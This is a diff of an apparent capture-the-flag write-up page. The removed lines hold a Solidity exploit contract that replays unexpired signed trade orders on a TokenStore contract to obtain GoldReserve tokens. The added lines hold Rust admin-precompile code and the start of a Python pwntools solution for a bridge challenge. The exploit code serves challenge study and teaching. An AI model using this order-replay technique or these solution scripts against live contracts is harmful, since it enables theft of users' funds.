+<span class="w">            </span><span class="n">ConfigKind</span>::<span class="n">DumpState</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="n">fn_dump_state</span><span class="p">(</span><span class="o">&amp;</span><span class="n">rest</span><span class="p">[</span><span class="mi">1</span><span class="o">..</span><span class="p">]),</span>
+<span class="w">            </span><span class="n">_</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="mi">1</span><span class="k">u64</span>
+<span class="w">        </span><span class="p">};</span>
+<span class="w">    </span><span class="p">}</span>
 <span class="p">}</span>
 
-<span class="kd">function</span><span class="w"> </span><span class="nx">withdrawToken</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_token</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">_amount</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="p">...</span>
-<span class="w">    </span><span class="nx">tokens</span><span class="p">[</span><span class="nx">_token</span><span class="p">][</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">safeSub</span><span class="p">(</span><span class="nx">tokens</span><span class="p">[</span><span class="nx">_token</span><span class="p">][</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">],</span><span class="w"> </span><span class="nx">_amount</span><span class="p">);</span>
-<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nx">Token</span><span class="p">(</span><span class="nx">_token</span><span class="p">).</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">_amount</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="nx">revert</span><span class="p">();</span>
+<span class="k">fn</span> <span class="nf">admin_func_run</span><span class="p">(</span><span class="n">i</span>: <span class="kp">&amp;</span><span class="p">[</span><span class="kt">u8</span><span class="p">],</span><span class="w"> </span><span class="n">target_gas</span>: <span class="kt">u64</span><span class="p">,</span><span class="w"> </span><span class="n">context</span>: <span class="kp">&amp;</span><span class="nc">CallContext</span><span class="p">)</span><span class="w"> </span>-&gt; <span class="nc">PrecompileResult</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="o">..</span><span class="p">.</span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="n">gas_base</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">target_gas</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nb">Err</span><span class="p">(</span><span class="n">Error</span>::<span class="n">OutOfGas</span><span class="p">);</span>
 <span class="w">    </span><span class="p">}</span>
-<span class="w">    </span><span class="nx">Withdraw</span><span class="p">(</span><span class="nx">_token</span><span class="p">,</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">_amount</span><span class="p">,</span><span class="w"> </span><span class="nx">tokens</span><span class="p">[</span><span class="nx">_token</span><span class="p">][</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]);</span>
-<span class="p">}</span>
-</code></pre></div>
-</li>
-<li>
-<p>Now we need to get some GoldReserve tokens first! Through the <code>trade()</code> function, we can exchange for $XGR with signatures</p>
-<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">trade</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_tokenGet</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">_amountGet</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">_tokenGive</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">_amountGive</span><span class="p">,</span>
-<span class="w">    </span><span class="nx">uint</span><span class="w"> </span><span class="nx">_expires</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">_nonce</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">_user</span><span class="p">,</span><span class="w"> </span><span class="nx">uint8</span><span class="w"> </span><span class="nx">_v</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes32</span><span class="w"> </span><span class="nx">_r</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes32</span><span class="w"> </span><span class="nx">_s</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">_amount</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nx">bytes32</span><span class="w"> </span><span class="nx">hash</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">sha256</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">_tokenGet</span><span class="p">,</span><span class="w"> </span><span class="nx">_amountGet</span><span class="p">,</span><span class="w"> </span><span class="nx">_tokenGive</span><span class="p">,</span><span class="w"> </span><span class="nx">_amountGive</span><span class="p">,</span><span class="w"> </span><span class="nx">_expires</span><span class="p">,</span><span class="w"> </span><span class="nx">_nonce</span><span class="p">);</span>
-<span class="w">    </span><span class="c1">// Check order signatures and expiration, also check if not fulfilled yet</span>
-<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">ecrecover</span><span class="p">(</span><span class="nx">sha3</span><span class="p">(</span><span class="s2">&quot;\x19Ethereum Signed Message:\n32&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">hash</span><span class="p">),</span><span class="w"> </span><span class="nx">_v</span><span class="p">,</span><span class="w"> </span><span class="nx">_r</span><span class="p">,</span><span class="w"> </span><span class="nx">_s</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">_user</span><span class="w"> </span><span class="o">||</span>
-<span class="w">        </span><span class="nx">block</span><span class="p">.</span><span class="nx">number</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="nx">_expires</span><span class="w"> </span><span class="o">||</span>
-<span class="w">        </span><span class="nx">safeAdd</span><span class="p">(</span><span class="nx">orderFills</span><span class="p">[</span><span class="nx">_user</span><span class="p">][</span><span class="nx">hash</span><span class="p">],</span><span class="w"> </span><span class="nx">_amount</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="nx">_amountGet</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="nx">revert</span><span class="p">();</span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="n">i</span><span class="p">.</span><span class="n">len</span><span class="p">()</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="o">!</span><span class="n">is_multisig</span><span class="p">(</span><span class="o">&amp;</span><span class="n">context</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nb">Err</span><span class="p">(</span><span class="n">Error</span>::<span class="n">EnterpriseHalt</span><span class="p">);</span>
 <span class="w">    </span><span class="p">}</span>
-<span class="w">    </span><span class="nx">tradeBalances</span><span class="p">(</span><span class="nx">_tokenGet</span><span class="p">,</span><span class="w"> </span><span class="nx">_amountGet</span><span class="p">,</span><span class="w"> </span><span class="nx">_tokenGive</span><span class="p">,</span><span class="w"> </span><span class="nx">_amountGive</span><span class="p">,</span><span class="w"> </span><span class="nx">_user</span><span class="p">,</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">_amount</span><span class="p">);</span>
-<span class="w">    </span><span class="nx">orderFills</span><span class="p">[</span><span class="nx">_user</span><span class="p">][</span><span class="nx">hash</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">safeAdd</span><span class="p">(</span><span class="nx">orderFills</span><span class="p">[</span><span class="nx">_user</span><span class="p">][</span><span class="nx">hash</span><span class="p">],</span><span class="w"> </span><span class="nx">_amount</span><span class="p">);</span>
-<span class="w">    </span><span class="nx">Trade</span><span class="p">(</span><span class="nx">_tokenGet</span><span class="p">,</span><span class="w"> </span><span class="nx">_amount</span><span class="p">,</span><span class="w"> </span><span class="nx">_tokenGive</span><span class="p">,</span><span class="w"> </span><span class="nx">_amountGive</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nx">_amount</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="nx">_amountGet</span><span class="p">,</span><span class="w"> </span><span class="nx">_user</span><span class="p">,</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">_nonce</span><span class="p">);</span>
+
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">out</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">match</span><span class="w"> </span><span class="n">AdminCallKind</span>::<span class="n">from_u8</span><span class="p">(</span><span class="n">i</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">AdminCallKind</span>::<span class="n">EmergencyStop</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="n">fn_emergency_stop</span><span class="p">(</span><span class="o">&amp;</span><span class="n">i</span><span class="p">[</span><span class="mi">1</span><span class="o">..</span><span class="p">],</span><span class="w"> </span><span class="n">context</span><span class="p">),</span>
+<span class="w">        </span><span class="n">AdminCallKind</span>::<span class="n">ReloadRuntimeConfig</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="n">fn_reload_runtime_config</span><span class="p">(</span><span class="o">&amp;</span><span class="n">i</span><span class="p">[</span><span class="mi">1</span><span class="o">..</span><span class="p">],</span><span class="w"> </span><span class="n">context</span><span class="p">),</span>
+<span class="w">        </span><span class="n">AdminCallKind</span>::<span class="n">Mint</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="n">fn_mint</span><span class="p">(</span><span class="o">&amp;</span><span class="n">i</span><span class="p">[</span><span class="mi">1</span><span class="o">..</span><span class="p">],</span><span class="w"> </span><span class="n">context</span><span class="p">),</span>
+<span class="w">        </span><span class="n">AdminCallKind</span>::<span class="n">Burn</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="n">fn_burn</span><span class="p">(</span><span class="o">&amp;</span><span class="n">i</span><span class="p">[</span><span class="mi">1</span><span class="o">..</span><span class="p">],</span><span class="w"> </span><span class="n">context</span><span class="p">),</span>
+<span class="w">        </span><span class="n">AdminCallKind</span>::<span class="n">Unknown</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="kt">u64</span>::<span class="n">MAX</span>
+<span class="w">    </span><span class="p">};</span>
+
+<span class="w">    </span><span class="o">..</span><span class="p">.</span>
 <span class="p">}</span>
 
-<span class="kd">function</span><span class="w"> </span><span class="nx">tradeBalances</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_tokenGet</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">_amountGet</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">_tokenGive</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">_amountGive</span><span class="p">,</span>
-<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="nx">_user</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">_caller</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">_amount</span><span class="p">)</span><span class="w"> </span><span class="kr">private</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="p">...</span>
-<span class="w">    </span><span class="nx">tokens</span><span class="p">[</span><span class="nx">_tokenGet</span><span class="p">][</span><span class="nx">_user</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">safeAdd</span><span class="p">(</span><span class="nx">tokens</span><span class="p">[</span><span class="nx">_tokenGet</span><span class="p">][</span><span class="nx">_user</span><span class="p">],</span><span class="w"> </span><span class="nx">safeAdd</span><span class="p">(</span><span class="nx">_amount</span><span class="p">,</span><span class="w"> </span><span class="nx">rebateValue</span><span class="p">));</span>
-<span class="w">    </span><span class="nx">tokens</span><span class="p">[</span><span class="nx">_tokenGet</span><span class="p">][</span><span class="nx">_caller</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">safeSub</span><span class="p">(</span><span class="nx">tokens</span><span class="p">[</span><span class="nx">_tokenGet</span><span class="p">][</span><span class="nx">_caller</span><span class="p">],</span><span class="w"> </span><span class="nx">safeAdd</span><span class="p">(</span><span class="nx">_amount</span><span class="p">,</span><span class="w"> </span><span class="nx">feeTakeValue</span><span class="p">));</span>
-<span class="w">    </span><span class="nx">tokens</span><span class="p">[</span><span class="nx">_tokenGive</span><span class="p">][</span><span class="nx">_user</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">safeSub</span><span class="p">(</span><span class="nx">tokens</span><span class="p">[</span><span class="nx">_tokenGive</span><span class="p">][</span><span class="nx">_user</span><span class="p">],</span><span class="w"> </span><span class="nx">tokenGiveValue</span><span class="p">);</span>
-<span class="w">    </span><span class="nx">tokens</span><span class="p">[</span><span class="nx">_tokenGive</span><span class="p">][</span><span class="nx">_caller</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">safeAdd</span><span class="p">(</span><span class="nx">tokens</span><span class="p">[</span><span class="nx">_tokenGive</span><span class="p">][</span><span class="nx">_caller</span><span class="p">],</span><span class="w"> </span><span class="nx">tokenGiveValue</span><span class="p">);</span>
-<span class="w">    </span><span class="nx">tokens</span><span class="p">[</span><span class="nx">_tokenGet</span><span class="p">][</span><span class="nx">feeAccount</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">safeAdd</span><span class="p">(</span><span class="nx">tokens</span><span class="p">[</span><span class="nx">_tokenGet</span><span class="p">][</span><span class="nx">feeAccount</span><span class="p">],</span><span class="w"> </span><span class="nx">safeSub</span><span class="p">(</span><span class="nx">feeTakeValue</span><span class="p">,</span><span class="w"> </span><span class="nx">rebateValue</span><span class="p">));</span>
-<span class="w">    </span><span class="p">...</span>
+<span class="k">pub</span><span class="w"> </span><span class="k">enum</span> <span class="nc">AdminCallKind</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">EmergencyStop</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span>
+<span class="w">    </span><span class="n">ReloadRuntimeConfig</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span>
+<span class="w">    </span><span class="n">Mint</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span>
+<span class="w">    </span><span class="n">Burn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">4</span><span class="p">,</span>
+<span class="w">    </span><span class="n">Unknown</span><span class="p">,</span>
 <span class="p">}</span>
 </code></pre></div>
-</li>
-<li>
-<p>Trading orders can be partially filled. By using <a href="https://dune.com/queries/3239317">Dune</a>, we can find unexpired orders for GoldReserve tokens. Luckily, there are two orders with large amounts of unsold tokens XD</p>
-<table>
-<thead>
-<tr>
-<th>tx_hash</th>
-<th>_amount</th>
-<th>_amountGet</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>0x1483f5c6158dfb9a899b137ccfa988fb2b1f6927854dcd83e0a29caadd0e38ba</td>
-<td>4200000000000000</td>
-<td>84000000000000000</td>
-</tr>
-<tr>
-<td>0x6d727f761c7744bebf4a8773f5a06cd7af280dcda0b55c0995aea47d5570f1a1</td>
-<td>4246800000000000</td>
-<td>42468000000000000</td>
-</tr>
-</tbody>
-</table>
 </li>
 </ul>
-<h3 id="exploit">Exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><span class="kr">interface</span><span class="w"> </span><span class="nx">ITokenStore</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">tokens</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_token</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">_user</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="p">);</span>
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">deposit</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="p">;</span>
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">depositToken</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_token</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">_amount</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="p">;</span>
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">withdrawToken</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_token</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">_amount</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="p">;</span>
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">trade</span><span class="p">(</span>
-<span class="w">        </span><span class="nx">address</span><span class="w"> </span><span class="nx">_tokenGet</span><span class="p">,</span>
-<span class="w">        </span><span class="nx">uint</span><span class="w"> </span><span class="nx">_amountGet</span><span class="p">,</span>
-<span class="w">        </span><span class="nx">address</span><span class="w"> </span><span class="nx">_tokenGive</span><span class="p">,</span>
-<span class="w">        </span><span class="nx">uint</span><span class="w"> </span><span class="nx">_amountGive</span><span class="p">,</span>
-<span class="w">        </span><span class="nx">uint</span><span class="w"> </span><span class="nx">_expires</span><span class="p">,</span>
-<span class="w">        </span><span class="nx">uint</span><span class="w"> </span><span class="nx">_nonce</span><span class="p">,</span>
-<span class="w">        </span><span class="nx">address</span><span class="w"> </span><span class="nx">_user</span><span class="p">,</span>
-<span class="w">        </span><span class="nx">uint8</span><span class="w"> </span><span class="nx">_v</span><span class="p">,</span>
-<span class="w">        </span><span class="nx">bytes32</span><span class="w"> </span><span class="nx">_r</span><span class="p">,</span>
-<span class="w">        </span><span class="nx">bytes32</span><span class="w"> </span><span class="nx">_s</span><span class="p">,</span>
-<span class="w">        </span><span class="nx">uint</span><span class="w"> </span><span class="nx">_amount</span>
-<span class="w">    </span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="p">;</span>
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">availableVolume</span><span class="p">(</span>
-<span class="w">        </span><span class="nx">address</span><span class="w"> </span><span class="nx">_tokenGet</span><span class="p">,</span>
-<span class="w">        </span><span class="nx">uint</span><span class="w"> </span><span class="nx">_amountGet</span><span class="p">,</span>
-<span class="w">        </span><span class="nx">address</span><span class="w"> </span><span class="nx">_tokenGive</span><span class="p">,</span>
-<span class="w">        </span><span class="nx">uint</span><span class="w"> </span><span class="nx">_amountGive</span><span class="p">,</span>
-<span class="w">        </span><span class="nx">uint</span><span class="w"> </span><span class="nx">_expires</span><span class="p">,</span>
-<span class="w">        </span><span class="nx">uint</span><span class="w"> </span><span class="nx">_nonce</span><span class="p">,</span>
-<span class="w">        </span><span class="nx">address</span><span class="w"> </span><span class="nx">_user</span><span class="p">,</span>
-<span class="w">        </span><span class="nx">uint8</span><span class="w"> </span><span class="nx">_v</span><span class="p">,</span>
-<span class="w">        </span><span class="nx">bytes32</span><span class="w"> </span><span class="nx">_r</span><span class="p">,</span>
-<span class="w">        </span><span class="nx">bytes32</span><span class="w"> </span><span class="nx">_s</span>
-<span class="w">    </span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="p">);</span>
-<span class="p">}</span>
+<h3 id="solution_1">Solution<a class="headerlink" href="#solution_1" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">pwn</span>
+<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
+<span class="kn">from</span> <span class="nn">cheb3</span> <span class="kn">import</span> <span class="n">Connection</span>
+<span class="kn">from</span> <span class="nn">cheb3.utils</span> <span class="kn">import</span> <span class="n">compile_sol</span><span class="p">,</span> <span class="n">encode_with_signature</span><span class="p">,</span> <span class="n">decode_data</span>
 
-<span class="nx">contract</span><span class="w"> </span><span class="nx">Solve</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">CTFSolver</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nx">ITokenStore</span><span class="w"> </span><span class="nx">tokenStore</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">ITokenStore</span><span class="p">(</span><span class="mh">0x1cE7AE555139c5EF5A57CC8d814a867ee6Ee33D8</span><span class="p">);</span>
+<span class="n">bridge_abi</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">compile_sol</span><span class="p">(</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">interface IBridge {</span>
+<span class="sd">    function remoteTokenToLocalToken(address) external view returns (address);</span>
+<span class="sd">    function ERC20Out(address token, address to, uint256 amount) external;                       </span>
+<span class="sd">}</span>
+<span class="sd">&quot;&quot;&quot;</span><span class="p">,</span>
+    <span class="n">solc_version</span><span class="o">=</span><span class="s2">&quot;0.8.20&quot;</span><span class="p">,</span>
+<span class="p">)[</span><span class="s2">&quot;IBridge&quot;</span><span class="p">]</span>
+<span class="n">flag_token_abi</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">compile_sol</span><span class="p">(</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">interface IFlagToken {</span>
+<span class="sd">    function approve(address spender, uint256 amount) external returns (bool);</span>
+<span class="sd">    function balanceOf(address account) external view returns (uint256);</span>
+<span class="sd">}</span>
+<span class="sd">&quot;&quot;&quot;</span><span class="p">,</span>
+    <span class="n">solc_version</span><span class="o">=</span><span class="s2">&quot;0.8.20&quot;</span><span class="p">,</span>
+<span class="p">)[</span><span class="s2">&quot;IFlagToken&quot;</span><span class="p">]</span>
 
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">doTrade</span><span class="p">(</span>
-<span class="w">        </span><span class="nx">address</span><span class="w"> </span><span class="nx">_tokenGet</span><span class="p">,</span>
-<span class="w">        </span><span class="nx">uint</span><span class="w"> </span><span class="nx">_amountGet</span><span class="p">,</span>
-<span class="w">        </span><span class="nx">address</span><span class="w"> </span><span class="nx">_tokenGive</span><span class="p">,</span>
-<span class="w">        </span><span class="nx">uint</span><span class="w"> </span><span class="nx">_amountGive</span><span class="p">,</span>
-<span class="w">        </span><span class="nx">uint</span><span class="w"> </span><span class="nx">_expires</span><span class="p">,</span>
-<span class="w">        </span><span class="nx">uint</span><span class="w"> </span><span class="nx">_nonce</span><span class="p">,</span>
-<span class="w">        </span><span class="nx">address</span><span class="w"> </span><span class="nx">_user</span><span class="p">,</span>
-<span class="w">        </span><span class="nx">uint8</span><span class="w"> </span><span class="nx">_v</span><span class="p">,</span>
-<span class="w">        </span><span class="nx">bytes32</span><span class="w"> </span><span class="nx">_r</span><span class="p">,</span>
-<span class="w">        </span><span class="nx">bytes32</span><span class="w"> </span><span class="nx">_s</span>
-<span class="w">    </span><span class="p">)</span><span class="w"> </span><span class="nx">internal</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">tokenStore</span><span class="p">.</span><span class="nx">availableVolume</span><span class="p">(</span><span class="nx">_tokenGet</span><span class="p">,</span><span class="w"> </span><span class="nx">_amountGet</span><span class="p">,</span><span class="w"> </span><span class="nx">_tokenGive</span><span class="p">,</span><span class="w"> </span><span class="nx">_amountGive</span><span class="p">,</span><span class="w"> </span><span class="nx">_expires</span><span class="p">,</span><span class="w"> </span><span class="nx">_nonce</span><span class="p">,</span><span class="w"> </span><span class="nx">_user</span><span class="p">,</span><span class="w"> </span><span class="nx">_v</span><span class="p">,</span><span class="w"> </span><span class="nx">_r</span><span class="p">,</span><span class="w"> </span><span class="nx">_s</span><span class="p">);</span>
-<span class="w">        </span><span class="nx">tokenStore</span><span class="p">.</span><span class="nx">trade</span><span class="p">(</span><span class="nx">_tokenGet</span><span class="p">,</span><span class="w"> </span><span class="nx">_amountGet</span><span class="p">,</span><span class="w"> </span><span class="nx">_tokenGive</span><span class="p">,</span><span class="w"> </span><span class="nx">_amountGive</span><span class="p">,</span><span class="w"> </span><span class="nx">_expires</span><span class="p">,</span><span class="w"> </span><span class="nx">_nonce</span><span class="p">,</span><span class="w"> </span><span class="nx">_user</span><span class="p">,</span><span class="w"> </span><span class="nx">_v</span><span class="p">,</span><span class="w"> </span><span class="nx">_r</span><span class="p">,</span><span class="w"> </span><span class="nx">_s</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
-<span class="w">    </span><span class="p">}</span>
+<span class="n">HOST</span> <span class="o">=</span> <span class="s2">&quot;localhost&quot;</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">1337</span>
+<span class="n">svr</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
+<span class="n">svr</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;action?&quot;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;1&quot;</span><span class="p">)</span>
 
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">solve</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_challenge</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">player</span><span class="p">)</span><span class="w"> </span><span class="nx">internal</span><span class="w"> </span><span class="nx">override</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="nx">Challenge</span><span class="w"> </span><span class="nx">challenge</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">Challenge</span><span class="p">(</span><span class="nx">_challenge</span><span class="p">);</span>
-<span class="w">        </span><span class="nx">address</span><span class="w"> </span><span class="nx">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xC937f5027D47250Fa2Df8CbF21F6F88E98817845</span><span class="p">;</span>
-<span class="w">        </span><span class="nx">tokenStore</span><span class="p">.</span><span class="nx">deposit</span><span class="p">{</span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="mf">10</span><span class="w"> </span><span class="nx">ether</span><span class="p">}();</span><span class="w">  </span><span class="c1">// to buy $XGR</span>
-<span class="w">        </span><span class="nx">doTrade</span><span class="p">(</span>
-<span class="w">            </span><span class="nx">address</span><span class="p">(</span><span class="mf">0</span><span class="p">),</span>
-<span class="w">            </span><span class="mf">84000000000000000</span><span class="p">,</span>
-<span class="w">            </span><span class="nx">token</span><span class="p">,</span>
-<span class="w">            </span><span class="mf">200000000000</span><span class="p">,</span>
-<span class="w">            </span><span class="mf">108142282</span><span class="p">,</span>
-<span class="w">            </span><span class="mf">470903382</span><span class="p">,</span>
-<span class="w">            </span><span class="nx">address</span><span class="p">(</span><span class="mh">0xa219Fb3CfAE449F6b5157c1200652cc13e9c9EA8</span><span class="p">),</span>
-<span class="w">            </span><span class="mf">28</span><span class="p">,</span>
-<span class="w">            </span><span class="mh">0xf164a3e185694dadeb11a9e9e7371929675d2eb2a6e9daa4508e96bc81741018</span><span class="p">,</span>
-<span class="w">            </span><span class="mh">0x314f3b6d5ce7c3f396604e87373fe4fe0a10bef597287d840b942e57595cb29a</span>
-<span class="w">        </span><span class="p">);</span>
-<span class="w">        </span><span class="nx">doTrade</span><span class="p">(</span>
-<span class="w">            </span><span class="nx">address</span><span class="p">(</span><span class="mf">0</span><span class="p">),</span>
-<span class="w">            </span><span class="mf">42468000000000000</span><span class="p">,</span>
-<span class="w">            </span><span class="nx">token</span><span class="p">,</span>
-<span class="w">            </span><span class="mf">1000000000000</span><span class="p">,</span>
-<span class="w">            </span><span class="mf">109997981</span><span class="p">,</span>
-<span class="w">            </span><span class="mf">249363390</span><span class="p">,</span>
-<span class="w">            </span><span class="nx">address</span><span class="p">(</span><span class="mh">0x6FFacaa9A9c6f8e7CD7D1C6830f9bc2a146cF10C</span><span class="p">),</span>
-<span class="w">            </span><span class="mf">28</span><span class="p">,</span>
-<span class="w">            </span><span class="mh">0x2b80ada8a8d94ed393723df8d1b802e1f05e623830cf117e326b30b1780ae397</span><span class="p">,</span>
-<span class="w">            </span><span class="mh">0x65397616af0ec4d25f828b25497c697c58b3dcc852259eaf7c72ff487ce76e1e</span>
-<span class="w">        </span><span class="p">);</span>
